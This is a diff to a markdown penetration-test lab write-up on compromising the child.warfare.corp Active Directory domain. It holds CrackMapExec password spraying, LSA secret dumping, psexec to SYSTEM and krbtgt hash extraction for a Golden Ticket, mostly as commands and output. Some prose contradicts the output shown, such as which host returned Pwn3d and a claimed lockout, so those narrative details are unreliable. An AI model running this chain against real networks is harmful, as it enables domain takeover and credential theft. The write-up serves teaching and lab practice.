@@ -294,7 +294,7 @@ Host 192.168.98.30 is Up
 Host 192.168.98.120 is Up
 ```
 
-### 🔗 Proxychains for Stealthy Port & Service Enumeration
+### 🔗 Proxychains Service Tunneling
 
 <p class="indent-paragraph">
 Proxychains was installed on the machine attacker host and configured to route traffic through the SSH SOCKS4 proxy. The package was installed via:
@@ -325,6 +325,213 @@ Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-67-generic x86_64)
 Last login: Tue Apr 29 20:05:51 2025 from <IP>
 ```
 
-### 🔁 Pivoting into the Internal Network using Ligolo-ng
+### 🧠 Enumerating SMB with CrackMapExec
+
+<p class="indent-paragraph">
+With the targets in place and the SSH tunnel active, SMB enumeration was conducted using CrackMapExec to verify operating system fingerprints, domain membership and credential validity. The command authenticated as <code>john:User1@#$%6</code> against each host, resulting in one account lockout and two successful logons, confirming that these credentials permit lateral movement within the <code>child.warfare.corp</code> domain, a pivotal access point for deeper engagement.
+</p>
+
+```
+~$ cat targets.txt
+
+192.168.98.2
+192.168.98.15
+192.168.98.30
+192.168.98.120
+
+~$ proxychains -q crackmapexec smb targets.txt -u john -p 'User1@#$%6'
+
+SMB         192.168.98.2    445 DC01      [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:warfare.corp) (signing:True) (SMBv1:False)
+SMB         192.168.98.120  445 CDC      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CDC) (domain:child.warfare.corp) (signing:True) (SMBv1:False)
+SMB         192.168.98.30   445 MGMT     [*] Windows 10 / Server 2019 Build 17763 x64 (name:MGMT) (domain:child.warfare.corp) (signing:False) (SMBv1:True)
+SMB         192.168.98.2    445 DC01     [-] warfare.corp\john:User1@#$%6 STATUS_LOGON_FAILURE
+SMB         192.168.98.120  445 CDC      [*] child.warfare.corp\john:User1@#$%6 (Pwn3d!)
+```
+
+<p class="indent-paragraph">
+After confirming valid domain credentials for user <code>john</code> with the password <code>User1@#$%6</code> and successfully obtaining a <code>Pwn3d!</code> status on host <code>192.168.98.30</code><span class="codefix">,</span> a deeper enumeration was initiated using the --lsa flag via CrackMapExec to extract stored secrets.
+</p>
+
+```
+~$ proxychains -q crackmapexec smb 192.168.98.30 -u john -p 'User1@#$%6' --lsa
+
+SMB 192.168.98.30 445 MGMT [*] Windows 10 / Server 2019 Build 17763 x64 (name:MGMT) (domain:child.warfare.corp)
+(signing:False) (SMBv1:False)
+SMB 192.168.98.30 445 MGMT [+] child.warfare.corp\john:User1@#$%6 (Pwn3d!)
+SMB 192.168.98.30 445 MGMT [+] Dumping LSA secrets
+SMB 192.168.98.30 445 MGMT CHILD.WARFARE.CORP/john:$DCC2$10240#john#9855312d42ee254a7334845613120e61:
+(2025-01-17 14:47:56)
+SMB 192.168.98.30 445 MGMT
+CHILD.WARFARE.CORP/corpmngr:$DCC2$10240#corpmngr#7fd50bbab99e8ea7ae9c1899f6dea7c6: (2025-01-21 11:35:46)
+SMB 192.168.98.30 445 MGMT CHILD\MGMT$:aes256-cts-hmac-sha1-
+96:344c70047ade222c4ab35694d4e3e36de556692f02ec32fa54d3160f36246eec
+SMB 192.168.98.30 445 MGMT CHILD\MGMT$:aes128-cts-hmac-sha1-96:aa5b3d84614911fe611eafbda613baaf
+SMB 192.168.98.30 445 MGMT CHILD\MGMT$:des-cbc-md5:6402e0c20b89d386
+SMB 192.168.98.30 445 MGMT
+CHILD\MGMT$:plain_password_hex:4f005d003b006f0074005d003500760067002f0032007a0046004e0020004d0070002300360057003100500
+0770041002600700055003d005a0047006100370033003e003b0032004600410059002a006b0046004400410069003e00530066006a0033006e00
+61007a004e0060003300590063005e0048006c005c0053003e003e0033003c007300500043007a002500300031004b00610060002000540033007
+a003f004200580048002f0068006d0052006f0027005b00520061003b003a0075002b0050004a005d006b003c006d004c00730045005d005b00740
+06c004b00760045005c00280059003a0066002000
+SMB 192.168.98.30 445 MGMT
+CHILD\MGMT$:aad3b435b51404eeaad3b435b51404ee:0f5fe480dd7eaf1d59a401a4f268b563:::
+SMB 192.168.98.30 445 MGMT dpapi_machinekey:0x34e3cc87e11d51028ffb38c60b0afe35d197627d
+dpapi_userkey:0xb890e07ba0d31e31c758d305c2a29e1b4ea813a5
+SMB 192.168.98.30 445 MGMT
+NL$KM:df885acfa168074cc84de093af76093e726cd092e9ef9c72d6fe59c6cbb70382d896c9569b67dcdac871dd77b96916c8c1187d40c118474c48
+1ddf62a7c04682
+SMB 192.168.98.30 445 MGMT corpmngr@child.warfare.corp:User4&*&*
+```
+
+<p class="indent-paragraph">
+  These credentials represent high-value access material for further post-exploitation activities such as persistence or lateral movement within the <code>child.warfare.corp</code> domain. Following a successful LSA secrets dump on <code>192.168.98.30</code> (MGMT), a new account credential was recovered from memory—<code>corpmngr@child.warfare.corp:User4&*&*</code><span class="codefix">.</span> The presence of this domain user and its NTLM hashes in memory suggests another account with elevated privileges. To validate this finding, CrackMapExec was re-run against all known targets using the newly discovered credential.
+</p>
+
+```
+~$ proxychains -q crackmapexec smb targets.txt -u corpmngr -p 'User4&*&*' --lsa 
+
+SMB         192.168.98.2    445 DC01      [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:warfare.corp) (signing:True) (SMBv1:False)
+SMB         192.168.98.120  445 CDC      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CDC) (domain:child.warfare.corp) (signing:True) (SMBv1:False)
+SMB         192.168.98.30   445 MGMT     [*] Windows 10 / Server 2019 Build 17763 x64 (name:MGMT) (domain:child.warfare.corp) (signing:False) (SMBv1:True)
+SMB         192.168.98.2    445 DC01     [-] warfare.corp\corpmngr:User4&*&* STATUS_LOGON_FAILURE
+SMB         192.168.98.120  445 CDC      [*] child.warfare.corp\corpmngr:User4&*&*
+SMB         192.168.98.30   445 MGMT     [+] child.warfare.corp\corpmngr:User4&*&* (Pwn3d!)
+SMB         192.168.98.30   445 MGMT     [+] Dumping LSA secrets
+SMB         192.168.98.30   445 MGMT     CHILD\CDCS:aes256-cts-hmac-sha1-96:b7ac25ac1278b5951f685d8c50bc9ee98338af9ebe7ee3562be8673789c61c
+SMB         192.168.98.30   445 MGMT     CHILD\CDCS:aes128-cts-hmac-sha1-96:23ee315ec4d19de69db6e7691d3da9945d19632
+SMB         192.168.98.30   445 MGMT     CHILD\CDCS:des-cbc-md5:51a1a83ec41f9267
+SMB         192.168.98.30   445 MGMT     CHILD\CDCS:plain_password_hex:ef903d96c92358aeeb906b24de9d4b32e89fae2b35cbb9cfc...
+SMB         192.168.98.30   445 MGMT     CHILD\CDCS:aad3b435b51404eeaad3b435b51404ee:6ca9225cb415fec5953900a8513e968::::
+SMB         192.168.98.30   445 MGMT     dpapi_machinekey:0x95e0c0452350da239e70d692e67a5cc857a8dfd
+SMB         192.168.98.30   445 MGMT     dpapi_userkey:0xb890e07ba0d31e31c758d305c2a29e1b4ea813a5
+SMB         192.168.98.30   445 MGMT     NL$KM:df885acfa168074cc84de093af76093e726cd092e9ef9c72d6fe59c6cbb70382d896c9569b67dcdac871dd77b96916c8c1187d40c118474c481ddf62a7c04682
+SMB         192.168.98.30   445 MGMT     corpmngr@child.warfare.corp:User4&*&*
+```
+
+### 🔑 Internal Access
+
+<p class="indent-paragraph">
+After authenticating to the MGMT host <code>192.168.98.30</code> with the <code>child/john:User1@#$%6</code> credentials, the enumeration was escalated by dumping LSA secrets via CrackMapExec, revealing cached domain hashes, DPAPI keys and even a plaintext credential for another account. A subsequent execution of Impacket’s <code>psexec.py</code> achieved code execution as <code>NT AUTHORITY\SYSTEM</code><span class="codefix">,</span> confirming local administrator rights. Standard Windows discovery then verified that the machine was joined to the <code>child.warfare.corp</code> domain and had visibility toward the Child Domain Controller <code>cdc.child.warfare.corp</code><span class="codefix">.</span>
+</p>
+
+```
+~$ proxychains /root/.local/bin/psexec.py 'child/john:User1@#$%6@192.168.98.30'
+
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Requesting shares on 192.168.98.30.....
+[*] Found writable share ADMIN$
+[*] Uploading file LOYLoZut.exe
+[*] Opening SVCManager on 192.168.98.30.....
+[*] Creating service Heno on 192.168.98.30.....
+[*] Starting service Heno.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.3650]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+~$ C:\Windows\system32> whoami
+nt authority\system
+
+~$ C:\Windows\system32> net user /dom
+The request will be processed at a domain controller for domain child.warfare.corp.
+
+User accounts for \\cdc.child.warfare.corp
+Administrator             corpmngr              Guest
+john                      krbtgt
+The command completed with one or more errors.
+
+~$ C:\Windows\system32> ping cdc.child.warfare.corp
+Pinging cdc.child.warfare.corp [192.168.98.120] with 32 bytes of data:
+Reply from 192.168.98.120: bytes=32 time<1ms TTL=128
+Reply from 192.168.98.120: bytes=32 time<1ms TTL=128
+Reply from 192.168.98.120: bytes=32 time<1ms TTL=128
+Reply from 192.168.98.120: bytes=32 time<1ms TTL=128
+
+Ping statistics for 192.168.98.120:
+    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
+Approximate round trip times in milli-seconds:
+    Minimum = 0ms, Maximum = 0ms, Average = 0ms
+
+~$ C:\Windows\system32>
+```
+
+<p class="indent-paragraph">
+To validate session integrity on the MGMT host, several local enumeration commands were executed. The <code>whoami</code> output confirmed that the shell was running under <code>NT AUTHORITY\SYSTEM</code><span class="codefix">,</span> demonstrating full administrative control. A <code>query session</code> revealed an active console session for the Administrator account, confirming a privileged user was logged in. Finally, a Security log query via <code>wevtutil</code> for Event ID 4624 verified a successful logon event—while the user field in the snippet appeared as “N/A,” the machine name and audit success message confirmed the authentication was processed locally by MGMT, reinforcing the legitimacy of the SYSTEM-level access.
+</p>
+
+```
+~$ C:\Users> hostname
+mgmt
+
+~$ C:\Users> whoami
+nt authority\system
+
+~$ C:\Users> query session
+ SESSIONNAME       USERNAME       ID  STATE   TYPE        DEVICE
+ services          services        0  Disc
+ console           Administrator   1  Active
+
+~$ C:\Users> wevtutil qe Security "/q:*[System[(EventID=4624)]]" /f:text /c:5
+Event[0]:
+  Log Name: Security
+  Source: Microsoft-Windows-Security-Auditing
+  Date: 2025-01-15T19:33:34.110
+  Event ID: 4624
+  Task: Logon
+  Level: Information
+  Opcode: Info
+  Keyword: Audit Success
+  User: N/A
+  User Name: N/A
+  Computer: mgmt
+  Description:
+    indicates which sub-protocol was used among the NTLM protocols.
+    - Key length indicates the length of the generated session key. This will be 0 if no session key was requested.
+```
+
+<p class="indent-paragraph">
+  With a stable foothold and access to internal systems, the next step was to prepare for lateral movement and domain privilege escalation. Hostnames and domain information gathered during earlier enumeration were added to the attacker’s <code>/etc/hosts</code> file to ensure accurate name resolution for SMB and Kerberos operations.
+</p>
+
+```
+~$ sudo nano /etc/hosts
+
+192.168.98.2 dc01.warfare.corp
+192.168.98.120 cdc.child.warfare.corp
+```
+
+### 🎫 krbtgt Hash Dump
+
+<p class="indent-paragraph">
+  This hosts file update ensured seamless communication and Kerberos authentication with both parent and child domain controllers via fully qualified hostnames. At this point, SYSTEM–level access on the Child Domain Controller <code>192.168.98.120</code> enabled extraction of critical credential material. The first objective was to retrieve the <code>krbtgt</code> NTLM hash, which would later facilitate the creation of a Golden Ticket for unrestricted impersonation within the child—and ultimately the parent—domain.
+</p>
+
+```
+~$ proxychains /root/.local/bin/secretdump.py -debug child/corpmngr:'User4&*&*'@cdc.child.warfare.corp -just-dc-user 'child\krbtgt'
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+[+] Impacket Library Installation Path: /root/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+[+] Calling DRScrackNames for child\krbtgt
+[+] Calling DRSGetNCChanges for {1c0a5a45-4b61-4bdd-adfc-92982f35601d}
+[+] Entering NTDSHashes.__decryptHash
+[+] Decrypting hash for user: CN=krbtgt,CN=Users,DC=child,DC=warfare,DC=corp
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:e57dd34c1871b7a23fb17a77dec9b900:::
+[+] Leaving NTDSHashes.__decryptHash
+[+] Entering NTDSHashes.__decryptSupplementalInfo
+[+] Entering NTDSHashes.__decryptSupplementalInfo
+[*] Kerberos keys grabbed
+krbtgt:aes256-cts-hmac-sha1-96:ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2
+krbtgt:aes128-cts-hmac-sha1-96:806d6ea798a9626d3ad00516dd6968b5
+krbtgt:des-cbc-md5:ba0b49b6b6455885
+[*] Cleaning up ...
+```
+
+<p class="indent-paragraph">
+  With the krbtgt <code>NTLM hash</code> and <code>AES256 key</code> extracted from the Child Domain Controller (CDC), it is possible to craft a <code>Golden Ticket</code> that impersonates any user in the child domain, including high-privilege accounts. This forged ticket can then be used to access resources or perform lateral movement into the Parent Domain Controller (DC01) according to the established trust relationship.
+</p>
+
+### 🧾 krbtgt SID Dump
 
 </div>
